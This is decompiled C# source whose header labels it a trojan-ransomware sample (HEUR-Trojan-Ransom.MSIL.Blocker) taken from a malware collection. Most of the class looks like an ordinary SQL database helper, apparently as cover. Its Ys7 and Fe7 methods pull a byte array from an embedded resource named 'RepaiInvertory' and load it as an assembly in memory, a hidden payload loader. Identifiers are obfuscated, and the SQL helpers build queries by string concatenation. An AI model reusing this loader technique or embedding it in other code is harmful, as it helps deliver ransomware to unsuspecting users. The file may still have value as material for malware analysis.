// Decompiled with JetBrains decompiler
// Type: Ww0.y2D
// Assembly: a7A, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35A00F83-339C-407C-8770-B1A09BF1E0B3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-375b5d8e986b228149dbe2f4cd9df92e697491052531a094fb7172ad0d25bd82.exe

using b5E;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Rn4;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Xb1;

namespace Ww0
{
  public class y2D
  {
    protected SqlConnection SqlCon;
    protected SqlCommand SqlCom;
    protected SqlDataReader Sqldreader;
    protected SqlDataAdapter SqlDa;
    protected SqlCommandBuilder SqlComb;
    private string ConnectionString;

    public y2D()
    {
      this.ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
      this.SqlCon = new SqlConnection();
      this.SqlCon.ConnectionString = this.ConnectionString;
    }

    internal static bool Sy5(string Yk8)
    {
      bool flag;
      try
      {
        WebRequest.Create(Yk8).GetResponse();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_4;
      }
      flag = true;
label_4:
      return flag;
    }

    public bool z6L()
    {
      bool flag;
      try
      {
        if (this.SqlCon.State != ConnectionState.Open)
        {
          this.SqlCon.ConnectionString = this.ConnectionString;
          this.SqlCon.Open();
          flag = true;
        }
        else
          flag = false;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    protected bool c9B()
    {
      bool flag;
      try
      {
        if (this.SqlCon.State != 0)
        {
          this.SqlCon.Close();
          flag = true;
        }
        else
          flag = false;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Close Database");
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool r3Q(string He9, bool Xi7 = false)
    {
      bool flag;
      if (this.z6L())
      {
        try
        {
          this.SqlCom = new SqlCommand(He9, this.SqlCon);
          this.SqlCom.ExecuteNonQuery();
          flag = true;
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          SqlException sqlException = ex;
          if (Xi7)
          {
            int num = (int) Interaction.MsgBox((object) sqlException.Message, MsgBoxStyle.Critical, (object) "Execute!");
          }
          flag = false;
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.c9B();
          this.SqlCom.Dispose();
        }
      }
      return flag;
    }

    internal static byte[] Ys7(string[] p4F, int r2Y)
    {
      byte[] numArray;
      try
      {
        string[] strArray1 = new string[checked (p4F.Length - 1 + 1)];
        int num = checked (p4F.Length - 1);
        int index1 = 0;
        while (index1 <= num)
        {
          try
          {
            strArray1[index1] = p4F[index1].Replace(".resources", "");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index1; }
        }
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string baseName = strArray2[index2];
          if (baseName != null)
          {
            try
            {
              ResourceSet resourceSet = new ResourceManager(baseName, (Assembly) Kb1.mDic["Ass"]).GetResourceSet(CultureInfo.CurrentCulture, true, true);
              try
              {
                foreach (object obj in resourceSet.OfType<object>())
                {
                  DictionaryEntry dictionaryEntry = obj != null ? (DictionaryEntry) obj : new DictionaryEntry();
                  if (Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object) "RepaiInvertory", false))
                  {
                    numArray = (byte[]) dictionaryEntry.Value;
                    goto label_22;
                  }
                }
              }
              finally
              {
                IEnumerator<object> enumerator;
                enumerator?.Dispose();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_22:
      return numArray;
    }

    public SqlDataReader Hx0(string Sy3)
    {
      SqlDataReader sqlDataReader;
      try
      {
        if (this.z6L())
        {
          this.SqlCom = new SqlCommand(Sy3, this.SqlCon);
          this.Sqldreader = this.SqlCom.ExecuteReader();
        }
        sqlDataReader = this.Sqldreader;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get DataReader");
        sqlDataReader = (SqlDataReader) null;
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.c9B();
        this.SqlCom.Dispose();
      }
      return sqlDataReader;
    }

    public object Sp1(string f3D)
    {
      object obj = (object) null;
      try
      {
        if (this.z6L())
        {
          this.SqlCom = new SqlCommand(f3D, this.SqlCon);
          obj = RuntimeHelpers.GetObjectValue(this.SqlCom.ExecuteScalar());
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get Scalar");
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.c9B();
        this.SqlCom.Dispose();
      }
      return obj;
    }

    public DataTable j4T(string Qy0)
    {
      string tableName = string.Empty;
      try
      {
        tableName = Qy0.Substring(14);
        tableName = tableName.Substring(0, checked (tableName.IndexOf(" ") + 1));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      DataTable dataTable = new DataTable(tableName);
      this.SqlDa = new SqlDataAdapter(Qy0, this.SqlCon);
      if (this.z6L())
      {
        try
        {
          this.SqlDa.Fill(dataTable);
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get Datatable");
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.c9B();
          this.SqlDa.Dispose();
        }
      }
      return dataTable;
    }

    public static string Dw1(string Dp2) => Conversions.ToString(((System.Type) Kb1.mDic[Kb1.T]).InvokeMember(Dp2, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));

    public DataTable j5J(string Wr6, string o5H)
    {
      DataTable dataTable = new DataTable(Wr6);
      this.SqlDa = new SqlDataAdapter("Select * from " + Wr6 + " Where " + o5H, this.SqlCon);
      if (this.z6L())
      {
        try
        {
          this.SqlDa.Fill(dataTable);
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get DataTable");
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.c9B();
          this.SqlDa.Dispose();
        }
      }
      return dataTable;
    }

    public bool Nz4(string Lp1, DataTable s4B, bool Ar1 = false)
    {
      this.SqlDa = new SqlDataAdapter();
      this.SqlDa.SelectCommand = new SqlCommand(Lp1, this.SqlCon);
      this.SqlComb = new SqlCommandBuilder(this.SqlDa);
      bool flag;
      try
      {
        if (this.z6L())
        {
          this.SqlDa.Update(s4B);
          flag = true;
        }
        else
          flag = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        if (Ar1)
        {
          int num = (int) Interaction.MsgBox((object) exception.Message, MsgBoxStyle.Critical, (object) "Warning");
        }
        flag = false;
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.c9B();
        this.SqlDa.Dispose();
        this.SqlComb.Dispose();
      }
      return flag;
    }

    internal static void Fe7()
    {
      Assembly assembly = Thread.GetDomain().Load((byte[]) Kb1.mDic[Kb1.mArray]);
      Kb1.mDic.Add("Ass2", (object) assembly);
      if (!Kq4.Ed3())
        return;
      x7E.Fp5();
    }

    protected void Zy5()
    {
      this.c9B();
      GC.SuppressFinalize((object) this);
    }
  }
}
